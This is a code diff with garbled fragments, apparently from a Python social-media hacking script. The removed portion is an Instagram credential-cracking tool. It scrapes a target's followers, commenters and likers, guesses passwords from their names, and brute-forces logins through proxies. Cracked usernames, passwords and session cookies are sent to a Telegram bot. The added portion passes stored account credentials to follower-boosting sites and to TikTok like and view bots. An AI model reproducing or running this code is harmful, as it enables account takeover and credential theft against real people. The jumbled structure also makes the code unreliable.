-⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⣺⢁⣞⣉⡴⠟⡀⠀⠀⠀⠁⠸⡅⠀⠈⢷⠈⠏⠙⠀⢹⡛⠀⢉⠀⠀⠀⣀⣀⣼⡇⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⡟⢡⠖⣡⡴⠂⣀⣀⣀⣰⣁⣀⣀⣸⠀⠀⠀⠀⠈⠁⠀⠀⠈⠀⣠⠜⠋⣠⠁⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢿⣿⣿⣷⡟⢋⣥⣖⣉⠀⠈⢁⡀⠤⠚⠿⣷⡦⢀⣠⣀⠢⣄⣀⡠⠔⠋⠁⠀⣼⠃⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠈⠻⣿⣿⢿⣛⣩⠤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠒⢤⡀⠉⠁⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣤⣤⠴⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠤⠀⠀⠀⠀⠀⢩⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""")
 
 
-    def Menu(self):
-        self.Clear() ; self.Logos()
 
-                
+
+            process_fastfollow(username, password, target_username, operation_counter)
+            operation_counter += 1#
+            process_bigtakip_com(username, password, target_username, operation_counter)
+            operation_counter += 1
+            process_takipcimx_com(username, password, target_username, operation_counter)
+            operation_counter += 1
+            process_takipcimax(username, password, target_username, operation_counter)
+            operation_counter += 1
+            
+            process_takipcigir(username, password, target_username, operation_counter)
+            operation_counter += 1
+            process_takipcikingcom(username, password, target_username, operation_counter)
+            operation_counter += 1
+            
+            process_takipstarcom(username, password, target_username, operation_counter)
+            operation_counter += 1
+            
+            process_takipcizencom(username, password, target_username, operation_counter)
+            operation_counter += 1#cv
+
+
+
+
+
+            #process_platintakipci(username, password, target_username, operation_counter)
+          #  operation_counter += 1
+            
+            process_takipcigen(username, password, target_username, operation_counter)
+            operation_counter += 1
+            process_bigtakip(username, password, target_username, operation_counter)
+            operation_counter += 1
+            process_takipcimx(username, password, target_username, operation_counter)
+            operation_counter += 1
+            process_bayitakipci(username, password, target_username, operation_counter)
+            operation_counter += 1
+            
+            
+            
+            
+            
+    elif option == "2":
+        clear()
+        print(logo())
+        video_url = input(" 𝙻𝚒𝚗𝚔  𝚟𝚒𝚍𝚎𝚘  (𝚃𝚒𝚔𝚝𝚘𝚔 𝙻𝚒𝚔𝚜) 🎥 : ").strip()
+        clear()
+        
+        for acc in accounts:
+            username, password = acc.split("|")
+            process_tiktok_like(username, password, video_url)
+        input("\n✅ انتهى الإرسال! اضغط Enter للعودة للقائمة.")
+
+    elif option == "3":
+        clear()
+        print(logo())
+        video_url = input(" 𝙻𝚒𝚗𝚔  𝚟𝚒𝚍𝚎𝚘  (𝚃𝚒𝚔𝚝𝚘𝚔 𝚅𝚒𝚎𝚠) 🎥 : ").strip()
+        clear()
+        
+        for acc in accounts:
+            username, password = acc.split("|")
+            process_tiktok_view(username, password, video_url)
+        input("\n✅ تم إرسال المشاهدات! اضغط Enter للعودة للقائمة.")
+    elif option == "0":
+        print("👋 إلى اللقاء!")
+        break
+    else:
+        input("❌ خيار غير صالح! اضغط Enter للمحاولة مجدداً.")
         
         
-
-        Console().print(f'\n {M2}[{H2}4{M2}]{Ha}. 𝙲𝚊𝚛𝚌𝚔𝚒𝚗𝚐 𝙵𝚛𝚘𝚖 ғɪʟᴇ\n')
-        self.input_menu()
-
-    def input_menu(self):
-        x = '4'
-        if x == '1' or x == '01' or x == '2' or x == '02':
-             Console().print(f'\n {M2}[{H2}+{M2}]{B2}  𝙰𝚃𝚃𝙰𝙲𝙺\n\n')
-             uname = Console().input(f' {M2}[{H2}?{M2}]{K2} ᴜꜱᴇʀɴᴀᴍᴇ : ')
-             for users in uname.split(','):
-                 getid = self.get_id(users,kueh)
-             meki = False if x == '2' or x == '02' else True
-             self.dump_acc(kueh, getid, meki, '')
-             if len(self.id) > 0:self.methode()
-             else:Console().print(f' {P2}[{H2}+{P2}] Username/target yang anda masukan sudah ga perawan') ; time.sleep(3.1) ; self.Menu()
-
-        elif x == '3' or x == '03':
-             try:
-                 Console().print(f'\n {P2}[{H2}+{P2}] Masukan link postingan target dibawah\n {P2}[{H2}!{P2}] Postingan yang anda masukan harus publik ya')
-                 link = Console().input(f' {P2}[{H2}?{P2}] PostTarget : ')
-                 medi = self.get_mediaid(link, kueh)
-                 for uid in medi:
-                     self.GetUserComment(kueh, uid, '')
-                 self.methode()
-             except requests.exceptions.MissingSchema as e:
-                 Console().print(f'\n {P2}[{M2}!{P2}] Opshh... terjadi kesalahan pada url target\n {P2}[{M2}!{P2}] {str(e).title()}') ; time.sleep(3) ; self.Menu()
-
-
-        elif x == '4' or x == '04':
-             try:
-                 file_path = input('\n\033[1;37m\033[1;37m 𝙵𝙸𝙻𝙴\033[1;37m :\033[1;37m ')
-                 file = open(file_path, 'r').read()
-             except:
-                 Console().print(f'\n {P2}[{M2}!{P2}] Opshh terjadi kesalahan') ; exit()
-             for res in file.splitlines():
-                 try:
-                     user, pswd = res.split('|')[0], res.split('|')[1]
-                     formatusr = '%s<=>%s'%(user, pswd)
-                     if formatusr not in self.id:self.id.append(formatusr)
-                 except IndexError:continue
-             Console().print(f'\n {P2}[{H2}+{P2}] Files {K2}{len(self.id)}\n')
-             self.methode()
-
-
-        elif x == '6' or x == '06':
-            q = 0
-            Console().print(f'\n {P2}[{H2}1{P2}]. Check akun OK    {P2}[{H2}3{P2}]. Check akun A2F')
-            Console().print(f' {P2}[{H2}2{P2}]. Check akun CP    {P2}[{H2}4{P2}]. Back to menu')
-            h = Console().input(f' {P2}[{H2}?{P2}] Input menu : ')
-            if h in ('1','01'):dir='OK.txt'
-            elif h in ('2','02'):dir='CP.txt'
-            elif h in ('3','03'):dir='2F.txt'
-            elif h in ('4','04'):self.Menu()
-            else:self.Menu()
-            Console().print(f'\n {P2}[{H2}+{P2}]. Check akun {dir}')
-            for w in open(f'data/termux/internal/{dir}','r').read().splitlines():
-                q +=1
-                if dir == 'OK.txt':
-                   Console().print(f' {P2}[{H2}{q}{P2}]. {H2}{w}')
-                else:
-                   Console().print(f' {P2}[{H2}{q}{P2}]. {K2}{w}')
-            Console().print(f'\n {P2}[{H2}+{P2}] Berhasil mengecek akun OK/CP/A2F anda')
-            Console().print(f' {P2}[{H2}+{P2}] Insta1111GM :    ➛  {B2} Instagram {P2}BY {H2}Jhon Chen Xu\n {P2}[{H2}+{P2}] Copyright {H2}© {P2}2024 {B2}Jhon Chen Xu{P2} | All Rights Reserved')
-        elif x == 'exit' or x == 'Exit' or x =='EXIT':
-            os.system(f'rm -rf {self.dire}/ds_user_id.txt') ; self.Menu()
-        
-        elif x == 'lain' or x == 'Lain' or x =='LAIN':
-            Console().print(f'\n {P2}[{H2}1{P2}]. Upgrade license premium   {P2}[{H2}4{P2}]. Bot auto un-followers')
-            Console().print(f' {P2}[{H2}2{P2}]. Scrape proxies            {P2}[{H2}5{P2}]. Bot auto un-following')
-            Console().print(f' {P2}[{H2}3{P2}]. Scrape UserAgent          {P2}[{H2}6{P2}]. Exit/menu utama\n')
-            xxd = Console().input(f' {P2}[{H2}?{P2}] Input menu : ')
-            if xxd =='1' or xxd =='01':
-              os.system("xdg-open https://wa.me/+6283861183874?text=SAYA%20MAU%20ORDER%20LICENSE%20BANG") ; time.sleep(2) ; self.Menu()
-            else:time.sleep(2) ; self.Menu()
-        
-        else:self.Menu()
-
-    def get_id(self, ccv, cokie, list=[]):
-        try:
-            rsd = requests.get(f'https://www.instagram.com/{ccv}/', cookies = {'cookie': cokie}).text
-            uid = re.search('"user_id":"(\d+)"', str(rsd)).group(1)
-            if uid not in list:list.append(uid)
-            else:pass
-        except:pass
-        return(list)
-
-    def get_mediaid(self, url, cokie):
-        ahmasa = []
-        self.head.update({'cookie':cokie})
-        req = requests.get(url, headers = self.head).text
-        idm = re.search('"media_id":"(\d+)"',str(req)).group(1)
-        if len(idm) == 0:pass
-        else:ahmasa.append(idm)
-        return ahmasa
-
-    def GetUserComment(self, cookie, media_id, max_min):
-        try:
-            HEADERS = {
-                 'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
-                 'content-type': 'application/x-www-form-urlencoded',
-                 'x-csrftoken': re.findall('csrftoken=(.*?);',cookie)[0],
-                 'cookie': cookie
-            }
-            response = requests.get(f'https://www.instagram.com/api/v1/media/{media_id}/comments/?can_support_threading=true&permalink_enabled=false&min_id={max_min}', headers = HEADERS).json()
-            for y in response['comments']:
-                format = '%s<=>%s'%(y['user']['username'], y['user']['full_name'])
-                if format not in self.id:
-                   self.id.append(format)
-                   Console().print(f" {P2}[{H2}!{P2}] Berhasil dump {H2}{len(self.id)}{P2} uid {H2}{y['user']['id']}", end='\r')
-            if 'next_min_id' in str(response):
-                self.GetUserComment(cookie, media_id, response['next_min_id'])
-        except requests.exceptions.MissingSchema as e:
-            Console().print(f'\n {P2}[{M2}!{P2}] Terjadi kesalahan pada {str(e).title()}') ; time.sleep(3) ; self.Menu()
-
-    def Likes(self, cokie, mediaid):
-        try:
-            self.head.update({'x-csrftoken':re.search('csrftoken=(.*?);',str(cokie)).group(1)})
-            req = requests.get(f'https://www.instagram.com/api/v1/media/{mediaid}/likers/', cookies = {'cookie':cokie}, headers = self.head).json()
-            for data in req['users']:
-                xnxz = '%s<=>%s'%(data['username'], data['full_name'])
-                Console().print(f' {P2}[{H2}!{P2}] Berhasil dump {H2}{len(self.id)}{P2} uid {H2}{data["pk_id"]}{P2}', end='\r')
-                if xnxz not in self.id:self.id.append(xnxz)
-        except:pass
-
-    def dump_acc(self, cokie, users, type, max_id):
-        xnxx = 'followers' if type is True else 'following'
-        for user in users:
-            try:
-                self.param.update({'max_id':max_id})
-                Console().print(f'')
-                req = requests.get(f'https://www.instagram.com/api/v1/friendships/{user}/{xnxx}/', params = self.param, headers = self.head, cookies = {'cookie':cokie}).json()
-                for data in req['users']:
-                    xnxz = '%s<=>%s'%(data['username'], data['full_name'])
-                    Console().print(f' {P2}[{H2}!{P2}] waiting {H2}{len(self.id)}{P2} uid {H2}{data["pk_id"]}{P2}', end='\r')
-                    if xnxz not in self.id:self.id.append(xnxz)
-                if 'next_max_id' in str(req):self.dump_acc(cokie, users, type, req['next_max_id'])
-            except:pass
-        return self.id
-
-    def methode(self):
-        Console().print(f'\n\n {P2}[{H2}✓{P2}] uid: {H2}{len(self.id)}{P2} \n')
-        Console().print(f' {P2}[{H2}1{P2}]. Metode V1 (OK-CP)\n')
-        Console().print(f' {P2}[{H2}2{P2}]. Metode V2   (OK) ')
-        xyz = '1'
-        Console().print(f'\n {P2}[{H2}+{P2}] show : {B2}email, nomor, bio, userid, private, verifikasi\n')
-        yxz = 'y'
-        self.exec_malink(xyz, yxz)
-    
-    def exec_malink(self, methode_login, xontolmek):
-        os.system('clear')
-        Console().print(f'\n {M2}[{H2}+{M2}] {Na} cracking \n')
-        with executor(max_workers=25) as bol:
-           for kontol in self.id:
-               username, nama = kontol.split('<=>')
-               password = Require().Password(nama)
-               showdate = True if xontolmek in ('ya','y') else None
-               if methode_login in ('1','01'):bol.submit(self.ExecLogin, username, password, showdate)
-               elif methode_login in ('2','02'):bol.submit(self.api_vjs, username, password,showdate)
-
-        print('\n')
-        Console().print(f' {P2}[{H2}*{P2}] Hasil OK : {H2}{self.ok}\n {P2}[{H2}*{P2}] Hasil CP : {K2}{self.cp}') ; Console().print(f' {P2}[{H2}+{P2}] dan total yang anda crack {B2}{len(self.id)}{P2} username\n\n')
-        Console().print(f' {P2}[{H2}+{P2}] InstaG2222M :    ➛  {B2} Instagram {P2}BY {H2}Jhon Chen Xu.\n {P2}[{H2}+{P2}] Copyright {H2}© {P2}2024 {B2}Jhon Chen Xu{P2}. | All Rights Reserved')
-        __import__('os').remove('data/termux/internal/proxies.txt') ; sys.exit(0)
-
-    def friends_user(self, name):
-        try:
-            yxz = {'Host': 'www.instagram.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'none'}
-            self.head.update(yxz)
-            req = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={name}', headers = self.head).json()['data']['user']
-            ikut, mengikut, posting, fulmmnn = req['edge_followed_by']['count'], req['edge_follow']['count'], req['edge_owner_to_timeline_media']['count'], req['full_name']
-            return(ikut, mengikut, posting, fulmmnn)
-        except:
-            return("None", "None", "None", "None")
-    
-    def all_dateee(self, name):
-        try:
-            yxz = {'Host': 'www.instagram.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'none'}
-            self.head.update(yxz)
-            req = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={name}', headers = self.head).json()['data']['user']
-            ikut, mengikut, posting, fulmmnn, uidx, bio, pict, mutual, private, verifs, fbid, xxtime, bus = req['edge_followed_by']['count'], req['edge_follow']['count'], req['edge_owner_to_timeline_media']['count'], req['full_name'], req['id'], req['biography'], req['profile_pic_url_hd'], req['edge_mutual_followed_by']['count'], req['is_private'], req['is_verified'], req["fbid"], req['highlight_reel_count'], req['business_contact_method']
-            return(ikut, mengikut, posting, fulmmnn, uidx, bio, pict, mutual, private, verifs, fbid, xxtime, bus)
-        except:
-            return("None", "None", "None", "None", "None", "None", " None", "None", "None", "None", "None", "None", "None")
-#jjh
-    def ExecLogin(self, user, passwd, allData_akun = None, file = 'data/termux/internal/'):
-        uasu = []
-        requ = Require()
-        prox = requ.socks()
-        byps = requests.Session()
-        kont = random.randint
-        uaig = requ.UserAgent()
-        Console().print(f' {P2}[{H2}+{P2}] Rayen-Gamoudi-✓ : {H2}   ➛  {P2} ({H2}{self.lp}{P2}/{H2}{len(self.id)}{P2}) OK-:{H2}{self.ok}{P2}/CP-:{K2}{self.cp}{P2}/{P2}A2F-:{M2}{self.tw} ',end='\r') ; sys.stdout.flush()
-        while True:
-            try:
-                headers = {'User-Agent': uaig,'X-DEVICE-ID': '%s'%(str(uuid.uuid4())),'X-CM-Bandwidth-KBPS': '-1.000','X-CM-Latency': '-1.000','X-IG-App-Locale': 'id_ID','X-IG-Device-Locale': 'id_ID','X-IG-Connection-Speed': f'{random.randint(1000, 3700)}kbps','X-IG-Bandwidth-Speed-KBPS': '-1.000','X-IG-Bandwidth-TotalBytes-B': '0','X-IG-Bandwidth-TotalTime-MS': '0','X-Bloks-Version-Id': '1b030ce63a06c25f3e4de6aaaf6802fe1e76401bc5ab6e5fb85ed6c2d333e0c7','X-MID': '' if byps.cookies.get('mid') is None else byps.cookies.get('mid'),'X-IG-WWW-Claim': '0','X-Bloks-Is-Layout-RTL': 'false','X-IG-Connection-Type': 'WIFI','X-IG-Capabilities': '3brTvwE=','X-IG-App-ID': '567067343352427','X-IG-Device-ID': '%s'%(str(uuid.uuid4())),'X-IG-Android-ID': requ.DeviceId(),'Accept-Language': 'id-ID','X-FB-HTTP-Engine': 'Liger','Host': 'i.instagram.com','Accept-Encoding': 'gzip','Connection': 'close'}
-                payload = {'post': '1','country_codes': '[{"country_code":"1","source":["default"]}]','phone_id':requ.poid(),'adid':requ.adid(user),'guid':requ.guid(),'device_id':requ.DeviceId(),'google_tokens': '[]','login_attempt_count': '0','username':user,'password':'JhonChenXU','queryParams': '{}','optIntoOneTap': 'false'}
-                cookies = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
-                break
-            except requests.exceptions.ConnectionError as e:
-                time.sleep(15) ; self.ExecLogin(user, passwd, allData_akun, file='data/termux/internal/')
-            except:pass
-        for pswd in passwd:
-            if pswd:
-               try:
-                   payload.update({'password':pswd})
-                   headers.update({'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',})
-                   data = json.dumps(payload)
-                   xnxx = requ.Signature(data)
-                   prok = {'http': 'socks5://' + random.choice(prox)}
-                   resp = byps.post('https://i.instagram.com/api/v1/accounts/login/', cookies = {'cookie':cookies}, data = xnxx, headers = headers, proxies = prok)
-                   if 'logged_in_user' in str(resp.text):
-                       self.ok +=1
-                       cookie = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
-                       followers, following, postingan, fulxxnam = self.friends_user(user)
-                       if allData_akun is not None:
-                          try:
-                              followers, following, postingan, fulmmnn, uidx, bio, pict, mutual, private, verifs, fbid, timelines, busi = self.all_dateee(user)
-                              print('\r                                                                        ')
-                              Console().print(f'''\r {H2}    𖣘────━﴾𓆩OK𓆪﴿━────𖣘          \n\n  {H2}users_id{P2}: {P2}{uidx}\n  {H2}fullname{P2}: {fulmmnn}\n  {H2}username{P2}: {A2}{user}  |  {H2}password{P2}: {A2}{pswd}\n  {H2}follower{P2}: {followers}  |  {H2}followed{P2}: {following}  |  {H2}feedpost{P2}: {postingan}\n  {H2}biogrphy{P2}: {bio}\n  {H2}mutualss{P2}: {mutual}\n  {H2}privates{P2}: {private}\n  {H2}verifeed{P2}: {verifs}\n  {H2}fbuserid{P2}: {fbid}\n  {H2}reel_vid{P2}: {timelines}\n  {H2}business{P2}: {busi}\n  {H2}saved_as{P2}: data/result/{H2}{hari_save}\n  {H2}csrtoken{P2}: {A2}{cookie}\n  {H2}userAgnt{P2}: {A2}{uaig}\n  {H2}urprofil{P2}: {N2}{pict}''')
-                              save = f'{user}|{pswd}|{cookie}\n'
-                          except Exception as e:
-                                 print('\r                                                                        ')
-                                 Console().print(f'''\r {H2}         𖣘─────────────────━﴾𓆩OK𓆪﴿━─────────────────𖣘            \n\n           {H2}├ user: {B2}{user} {H2}| {H2}pass: {B2}{pswd}\n\n           {H2}├ OK{B2}: {self.ok} | {H2}following{B2}: {following}  \n\n           {H2}├ 𝙲𝙾𝙾𝙺𝙸𝙴𝚂└──> \033[38;5;48m{cookie}\n\n {H2}         𖣘─────────────────━﴾𓆩XD𓆪﴿━─────────────────𖣘          \n\n''')
-                       else:                            
-                            print('\r                                                                        ')
-                            
-                            requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str('✵ OK- : '+user+' ׀ '+pswd+' | '+cookie))
-                       break
-                   elif 'two_factor_required' in str(resp.text):
-                        followers, following, postingan, fulxxnam = self.friends_user(user)
-                        print('\r                                                                     ')
-                        Console().print(f'''\r {M2}         𖣘─────────────────━﴾𓆩A2F𓆪﴿━─────────────────𖣘          \n\n    {M2}user: {B2}{user} {M2}| {M2}pass{U2}: {B2}{pswd}\n\n    {M2}followers{B2}: {followers} | {M2}following{B2}: {following}  \n    {M2}fullname{B2}: {fulxxnam} | {M2}feedpost{B2}: {postingan}\n\n {M2}         𖣘─────────────────━﴾𓆩XD𓆪﴿━─────────────────𖣘          \n\n''')
-                        
-                        self.tw +=1
-                        
-                        break
-                   elif 'https://i.instagram.com/challenge/' in str(resp.text):
-                        followers, following, postingan, fulxxnam = self.friends_user(user)
-                        
-                        print('\r                                                                        ')
-                        Console().print(f'''\r {K2}         𖣘─────────────────━﴾𓆩CP𓆪﴿━─────────────────𖣘            \n\n           {K2}user: {B2}{user} {K2}| {K2}pass: {B2}{pswd}\n\n           {K2}followers{B2}: {followers} | {K2}following{B2}: {following}  \n\n           {K2}fullname{B2}: {fulxxnam} | {K2}feedpost{B2}: {postingan}\n\n {K2}         𖣘─────────────────━﴾𓆩XD𓆪﴿━─────────────────𖣘          \n\n''')
-                        
-                        self.cp +=1
-                        requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str('✵ CP- : '+user+' ׀ '+pswd))
-                        break
-               except requests.exceptions.ConnectionError as e:
-                   time.sleep(10) ; self.ExecLogin(user, passwd, allData_akun, file='data/termux/internal/')
-        self.lp +=1
-#:6
-
-
-if __name__=='__main__':
-  Brute().Menu()
-  #🧐🙃@😂😂😂💔🍀🍀+_'+_6'6💔
+        #'+'-6'تتjvvhggfvvnhhj
